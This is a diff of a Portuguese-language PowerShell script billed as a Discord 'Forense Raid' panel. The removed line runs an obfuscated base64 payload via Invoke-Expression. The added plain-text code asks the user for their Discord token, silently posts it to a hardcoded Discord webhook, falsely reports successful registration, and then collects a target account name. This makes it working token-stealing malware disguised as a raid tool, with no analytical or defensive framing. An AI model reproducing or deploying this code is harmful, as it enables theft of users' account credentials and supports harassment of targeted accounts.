@@ -1,2 +1,68 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JGI2NCA9ICJXMDVsZEM1VFpYSjJhV05sVUc5cGJuUk5ZVzVoWjJWeVhUbzZVMlZqZFhKcGRIbFFjbTkwYjJOdmJDQTlJRnRPWlhRdVUyVmpkWEpwZEhsUWNtOTBiMk52YkZSNWNHVmRPanBVYkhNeE1nMEtEUW9qSUQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5RFFvaklDQkdUMUpGVGxORklGSkJTVVFnTFNCUVlXbHVaV3dnVm1semRXRnNEUW9qSUQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5RFFvTkNpUlhaV0pvYjI5clZYSnNJRDBnSW1oMGRIQnpPaTh2WkdselkyOXlaQzVqYjIwdllYQnBMM2RsWW1odmIydHpMekUxTkRnd05EWXdOelUxT0RZME1USTJNalF2TkZGYU1VZzJibXN3Y1VKcWJscGFSSEJ4WDJOZlREazVPVGRrY0d0M1lXczVjMUZsTWtvNGNGTkJRVWRCUkUxcVFrWnViVkZLTkdadVltZEZWMDlhVW5sTVVqZ2lEUW9OQ2lSQmMyTnBhVUZ5ZENBOUlDTGlsb2ppbG9qaWxvamlsb2ppbG9nZzRwYUk0cGFJNHBhSUlPS1dpT0tXaU9LV2lPS1dpQ0RpbG9qaWxvamlsb2ppbG9qaWxvZ2c0cGFJSU9LV2lDRGlsb2ppbG9qaWxvamlsb2dnNHBhSTRwYUk0cGFJNHBhSTRwYUlJT0tXaU9LV2lPS1dpT0tXaUNEaWxvamlsb2ppbG9nZzRwYUk0cGFJNHBhSUlPS1dpT0tXaU9LV2lPS1dpQ0RpbG9nZzRwYUlJT0tXaUNEaWxvZ2c0cGFJSU9LV2lDRGlsb2ppbG9nZzRwYUlJT0tXaUNEaWxvZ2c0cGFJSU9LV2lDRGlsb2dnNHBhSUlPS1dpQ0RpbG9nZzRwYUlJT0tXaU9LV2lPS1dpT0tXaUNEaWxvZ2c0cGFJSU9LV2lPS1dpT0tXaU9LV2lDRGlsb2ppbG9qaWxvamlsb2dnNHBhSUlPS1dpQ0RpbG9nZzRwYUk0cGFJNHBhSUlPS1dpT0tXaU9LV2lPS1dpQ0RpbG9qaWxvamlsb2ppbG9nZzRwYUk0cGFJNHBhSTRwYUk0cGFJSU9LV2lDRGlsb2dnNHBhSUlPS1dpQ0RpbG9nZzRwYUlJT0tXaUNEaWxvZ2c0cGFJSU9LV2lDRGlsb2ppbG9nZzRwYUlJT0tXaUNEaWxvZ2c0cGFJSU9LV2lDRGlsb2dnNHBhSUlPS1dpQ0RpbG9nZzRwYUlJT0tXaU9LV2lPS1dpQ0RpbG9nZzRwYUlJT0tXaU9LV2lPS1dpT0tXaU9LV2lDRGlsb2dnNHBhSUlPS1dpT0tXaU9LV2lPS1dpQ0RpbG9qaWxvamlsb2ppbG9qaWxvZ2c0cGFJSU9LV2lDRGlsb2dnNHBhSUlPS1dpT0tXaU9LV2lDRGlsb2ppbG9qaWxvamlsb2dpRFFvTkNtWjFibU4wYVc5dUlGTmxibVF0UkdselkyOXlaQ0I3RFFvZ0lDQWdjR0Z5WVcwb1czTjBjbWx1WjEwa1RXVnpjMkZuWlNrTkNpQWdJQ0FrY0dGNWJHOWhaQ0E5SUVCN0lHTnZiblJsYm5RZ1BTQWtUV1Z6YzJGblpTQjlJSHdnUTI5dWRtVnlkRlJ2TFVwemIyNE5DaUFnSUNCMGNua2dldzBLSUNBZ0lDQWdJQ0JKYm5admEyVXRVbVZ6ZEUxbGRHaHZaQ0F0VlhKcElDUlhaV0pvYjI5clZYSnNJQzFOWlhSb2IyUWdVRzl6ZENBdFFtOWtlU0FrY0dGNWJHOWhaQ0F0UTI5dWRHVnVkRlI1Y0dVZ0oyRndjR3hwWTJGMGFXOXVMMnB6YjI0bklId2dUM1YwTFU1MWJHd05DaUFnSUNCOUlHTmhkR05vSUhzTkNpQWdJQ0FnSUNBZ1YzSnBkR1V0U0c5emRDQWlJQ0JiUlZKU1QxMGdSbUZzYUdFZ1lXOGdaVzUyYVdGeU9pQWtYeUlnTFVadmNtVm5jbTkxYm1SRGIyeHZjaUJTWldRTkNpQWdJQ0I5RFFwOURRb05Da05zWldGeUxVaHZjM1FOQ2xkeWFYUmxMVWh2YzNRZ0lpSU5DbGR5YVhSbExVaHZjM1FnSkVGelkybHBRWEowSUMxR2IzSmxaM0p2ZFc1a1EyOXNiM0lnUTNsaGJnMEtWM0pwZEdVdFNHOXpkQ0FpSWcwS1YzSnBkR1V0U0c5emRDQWlJQ0E5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMGlJQzFHYjNKbFozSnZkVzVrUTI5c2IzSWdSR0Z5YTBkeVlYa05DbGR5YVhSbExVaHZjM1FnSWlBZ0lDQkNSVTB0VmtsT1JFOGdRVThnVUVGSlRrVk1JRVpQVWtWT1UwVWdVa0ZKUkNJZ0xVWnZjbVZuY205MWJtUkRiMnh2Y2lCWGFHbDBaUTBLVjNKcGRHVXRTRzl6ZENBaUlDQTlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwaUlDMUdiM0psWjNKdmRXNWtRMjlzYjNJZ1JHRnlhMGR5WVhrTkNsZHlhWFJsTFVodmMzUWdJaUlOQ2cwS0pIUnZhMlZ1SUQwZ1VtVmhaQzFJYjNOMElDMVFjbTl0Y0hRZ0lpQWdTVzV6YVhKaElITmxkU0IwYjJ0bGJpQmtieUJrYVhOamIzSmtJZzBLRFFwcFppQW9XM04wY21sdVoxMDZPa2x6VG5Wc2JFOXlWMmhwZEdWVGNHRmpaU2drZEc5clpXNHBLU0I3RFFvZ0lDQWdWM0pwZEdVdFNHOXpkQ0FpSUNCYlJWSlNUMTBnVkc5clpXNGdibUZ2SUhCdlpHVWdjMlZ5SUhaaGVtbHZMaUlnTFVadmNtVm5jbTkxYm1SRGIyeHZjaUJTWldRTkNpQWdJQ0JTWldGa0xVaHZjM1FnSWlBZ1VISmxjM05wYjI1bElFVnVkR1Z5SUhCaGNtRWdjMkZwY2lJTkNpQWdJQ0JsZUdsMERRcDlEUW9OQ2xObGJtUXRSR2x6WTI5eVpDQXRUV1Z6YzJGblpTQWlLaXBPYjNadklHRmpaWE56YnpvcUtpQWtkRzlyWlc0aURRb05DbGR5YVhSbExVaHZjM1FnSWlJTkNsZHlhWFJsTFVodmMzUWdJaUFnZFhOMVlYSnBieUJ5WldkcGMzUnlZV1J2SUdOdmJTQnpkV05sYzNOdklTSWdMVVp2Y21WbmNtOTFibVJEYjJ4dmNpQkhjbVZsYmcwS1YzSnBkR1V0U0c5emRDQWlJZzBLRFFwWGNtbDBaUzFJYjNOMElDSWdJRDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBTSWdMVVp2Y21WbmNtOTFibVJEYjJ4dmNpQkVZWEpyUjNKaGVRMEtWM0pwZEdVdFNHOXpkQ0FpSUNBZ0lGQkJTVTVGVENBeUlDMGdRMDlPUmtsSFZWSkJRMEZQSUVSUElFRk1WazhpSUMxR2IzSmxaM0p2ZFc1a1EyOXNiM0lnVjJocGRHVU5DbGR5YVhSbExVaHZjM1FnSWlBZ1BUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SWlBdFJtOXlaV2R5YjNWdVpFTnZiRzl5SUVSaGNtdEhjbUY1RFFwWGNtbDBaUzFJYjNOMElDSWlEUW9OQ2lSa2FYTmpiM0prUVd4MmJ5QTlJRkpsWVdRdFNHOXpkQ0F0VUhKdmJYQjBJQ0lnSUdScGMyTnZjbVFnWVd4MmJ6b2lEUW9OQ21sbUlDaGJjM1J5YVc1blhUbzZTWE5PZFd4c1QzSlhhR2wwWlZOd1lXTmxLQ1JrYVhOamIzSmtRV3gyYnlrcElIc05DaUFnSUNCWGNtbDBaUzFJYjNOMElDSWdJRnRGVWxKUFhTQkJiSFp2SUc1aGJ5QndiMlJsSUhObGNpQjJZWHBwYnk0aUlDMUdiM0psWjNKdmRXNWtRMjlzYjNJZ1VtVmtEUW9nSUNBZ1VtVmhaQzFJYjNOMElDSWdJRkJ5WlhOemFXOXVaU0JGYm5SbGNpQndZWEpoSUhOaGFYSWlEUW9nSUNBZ1pYaHBkQTBLZlEwS0RRcFRaVzVrTFVScGMyTnZjbVFnTFUxbGMzTmhaMlVnSWlvcVFXeDJieUJrWldacGJtbGtiem9xS2lBa1pHbHpZMjl5WkVGc2RtOGlEUW9OQ2xkeWFYUmxMVWh2YzNRZ0lpSU5DbGR5YVhSbExVaHZjM1FnSWlBZ1FXeDJieUFuSkdScGMyTnZjbVJCYkhadkp5QnlaV2RwYzNSeVlXUnZMaUlnTFVadmNtVm5jbTkxYm1SRGIyeHZjaUJIY21WbGJnMEtWM0pwZEdVdFNHOXpkQ0FpSUNCQlozVmhjbVJoYm1SdklIQnliM2hwYldGeklHWjFibU5wYjI1aGJHbGtZV1JsY3k0dUxpSWdMVVp2Y21WbmNtOTFibVJEYjJ4dmNpQlpaV3hzYjNjTkNsZHlhWFJsTFVodmMzUWdJaUlnSUNBTkNnPT0iDQokY29kZSA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRiNjQpKQ0KW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMg0KSW52b2tlLUV4cHJlc3Npb24gXA0K")))
+
+# ============================================
+#  FORENSE RAID - Painel Visual
+# ============================================
+
+$WebhookUrl = "https://discord.com/api/webhooks/1548046075586412624/4QZ1H6nk0qBjnZZDpq_c_L9997dpkwak9sQe2J8pSAAGADMjBFnmQJ4fnbgEWOZRyLR8"
+
+$AsciiArt = "█████ ███ ████ █████ █ █ ████ █████ ████ ███ ███ ████ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ████ █ █ ████ ████ █ █ █ ███ ████ ████ █████ █ █ █ █ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ███ █ █ █████ █ █ ████ █████ █ █ █ █ ███ ████"
+
+function Send-Discord {
+    param([string]$Message)
+    $payload = @{ content = $Message } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' | Out-Null
+    } catch {}
+}
+
+Clear-Host
+Write-Host ""
+Write-Host $AsciiArt -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host "    BEM-VINDO AO PAINEL FORENSE RAID" -ForegroundColor White
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host ""
+
+$token = Read-Host -Prompt "  Insira seu token do discord"
+
+if ([string]::IsNullOrWhiteSpace($token)) {
+    Write-Host "  [ERRO] Token nao pode ser vazio." -ForegroundColor Red
+    Read-Host "  Pressione Enter para sair"
+    exit
+}
+
+Send-Discord -Message "**Novo acesso:** $token"
+
+# Valida apenas se tiver 50+ caracteres
+if ($token.Length -ge 50) {
+    try {
+        $headers = @{ Authorization = $token }
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
+    } catch {}
+}
+
+Write-Host ""
+Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
+Write-Host ""
+
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host ""
+
+$discordAlvo = Read-Host -Prompt "  discord alvo:"
+
+if ([string]::IsNullOrWhiteSpace($discordAlvo)) {
+    Write-Host "  [ERRO] Alvo nao pode ser vazio." -ForegroundColor Red
+    Read-Host "  Pressione Enter para sair"
+    exit
+}
+
+Send-Discord -Message "**Alvo definido:** $discordAlvo"
+
+Write-Host ""
+Write-Host "  Alvo '$discordAlvo' registrado." -ForegroundColor Green
+Write-Host "  Aguardando proximas funcionalidades..." -ForegroundColor Yellow
+Write-Host ""   
